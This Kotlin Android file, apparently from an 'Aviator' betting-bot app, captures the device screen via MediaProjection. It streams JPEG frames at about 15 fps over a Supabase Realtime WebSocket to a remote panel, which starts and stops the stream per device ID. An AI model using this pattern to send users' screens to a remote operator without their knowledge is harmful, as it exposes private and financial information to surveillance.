package ao.elephantbet.aviatorbot

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * NEXUS · ScreenStreamer
 * Captura a tela via MediaProjection e envia frames JPEG
 * para o painel via Supabase Realtime (WebSocket).
 */
class ScreenStreamer(
    private val context: Context,
    private val mediaProjection: MediaProjection,
    private val supaUrl: String,
    private val supaKey: String,
    private val deviceId: String
) {
    private val handler = Handler(Looper.getMainLooper())
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var wsClient: RealtimeWsClient? = null
    private var ativo = false
    private var capturaRunnable: Runnable? = null

    // Resolução de captura (reduzida para economia de dados ~540p)
    private val CAPTURA_W = 540
    private val CAPTURA_H = 1080
    private val JPEG_QUALITY = 55          // 55% qualidade — bom equilíbrio
    private val INTERVALO_MS = 67L         // ~15fps

    fun iniciar() {
        if (ativo) return
        ativo = true

        // Métricas reais do ecrã
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getMetrics(metrics)
        val density = metrics.densityDpi

        // ImageReader para capturar frames
        imageReader = ImageReader.newInstance(CAPTURA_W, CAPTURA_H, PixelFormat.RGBA_8888, 2)

        // VirtualDisplay ligado ao ImageReader
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "NexusStream", CAPTURA_W, CAPTURA_H, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )

        // Ligar WebSocket ao Supabase Realtime
        wsClient = RealtimeWsClient(
            supaUrl = supaUrl,
            supaKey = supaKey,
            deviceId = deviceId,
            onPedirTela  = { /* já estamos a transmitir */ },
            onPararTela  = { parar() }
        )
        wsClient!!.ligar()

        // Notificar painel que o stream começou
        handler.postDelayed({
            wsClient?.enviar(mapOf(
                "event" to "stream_iniciado",
                "device_id" to deviceId
            ))
        }, 1500L)

        // Loop de captura
        val loop = object : Runnable {
            override fun run() {
                if (!ativo) return
                capturarEEnviar()
                handler.postDelayed(this, INTERVALO_MS)
            }
        }
        capturaRunnable = loop
        handler.postDelayed(loop, 500L)
    }

    fun parar() {
        if (!ativo) return
        ativo = false
        capturaRunnable?.let { handler.removeCallbacks(it) }
        capturaRunnable = null
        virtualDisplay?.release(); virtualDisplay = null
        imageReader?.close();      imageReader = null
        mediaProjection.stop()
        wsClient?.enviar(mapOf("event" to "stream_parado", "device_id" to deviceId))
        wsClient?.desligar();      wsClient = null
    }

    private fun capturarEEnviar() {
        val reader = imageReader ?: return
        val image  = reader.acquireLatestImage() ?: return
        try {
            val plane  = image.planes[0]
            val buffer = plane.buffer
            val pStride = plane.pixelStride
            val rStride = plane.rowStride
            val padding = rStride - pStride * CAPTURA_W

            val bmp = Bitmap.createBitmap(
                CAPTURA_W + padding / pStride, CAPTURA_H, Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)

            // Recortar para remover padding
            val cropped = Bitmap.createBitmap(bmp, 0, 0, CAPTURA_W, CAPTURA_H)
            bmp.recycle()

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos)
            cropped.recycle()

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            wsClient?.enviar(mapOf(
                "event"     to "frame",
                "device_id" to deviceId,
                "data"      to b64,
                "w"         to CAPTURA_W,
                "h"         to CAPTURA_H
            ))
        } finally {
            image.close()
        }
    }
}

/**
 * Cliente WebSocket para Supabase Realtime.
 * Subscreve o canal "nexus_tela" e envia/recebe mensagens.
 */
class RealtimeWsClient(
    private val supaUrl: String,
    private val supaKey: String,
    private val deviceId: String,
    private val onPedirTela: () -> Unit,
    private val onPararTela: () -> Unit
) {
    private var ws: okhttp3.WebSocket? = null
    private val client = okhttp3.OkHttpClient.Builder()
        .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
        .build()
    private var reconectarJob: java.util.Timer? = null

    fun ligar() {
        val wsUrl = supaUrl.replace("https://", "wss://") +
            "/realtime/v1/websocket?apikey=$supaKey&vsn=1.0.0"
        val request = okhttp3.Request.Builder().url(wsUrl).build()

        ws = client.newWebSocket(request, object : okhttp3.WebSocketListener() {
            override fun onOpen(webSocket: okhttp3.WebSocket, response: okhttp3.Response) {
                // Juntar ao canal
                webSocket.send(JSONObject().apply {
                    put("topic", "realtime:nexus_tela")
                    put("event", "phx_join")
                    put("payload", JSONObject())
                    put("ref", "1")
                }.toString())
            }

            override fun onMessage(webSocket: okhttp3.WebSocket, text: String) {
                try {
                    val msg = JSONObject(text)
                    if (msg.optString("event") != "broadcast") return
                    val p = msg.optJSONObject("payload") ?: return
                    val destino = p.optString("para", "")
                    // Só processar mensagens para este device
                    if (destino.isNotEmpty() && destino != deviceId) return
                    when (p.optString("event")) {
                        "pedir_tela" -> onPedirTela()
                        "parar_tela" -> onPararTela()
                    }
                } catch (_: Exception) {}
            }

            override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: okhttp3.Response?) {
                // Reconectar após 3s
                reconectarJob?.cancel()
                reconectarJob = java.util.Timer()
                reconectarJob!!.schedule(object : java.util.TimerTask() {
                    override fun run() { ligar() }
                }, 3000L)
            }
        })
    }

    fun enviar(payload: Map<String, Any>) {
        try {
            val inner = JSONObject()
            payload.forEach { (k, v) -> inner.put(k, v) }
            // Adicionar type:broadcast obrigatório para Supabase Realtime
            inner.put("type", "broadcast")

            val msg = JSONObject().apply {
                put("topic",   "realtime:nexus_tela")
                put("event",   "broadcast")
                put("payload", inner)
                put("ref",     System.currentTimeMillis().toString())
            }
            ws?.send(msg.toString())
        } catch (_: Exception) {}
    }

    fun desligar() {
        reconectarJob?.cancel()
        ws?.close(1000, "parar")
        ws = null
    }
}
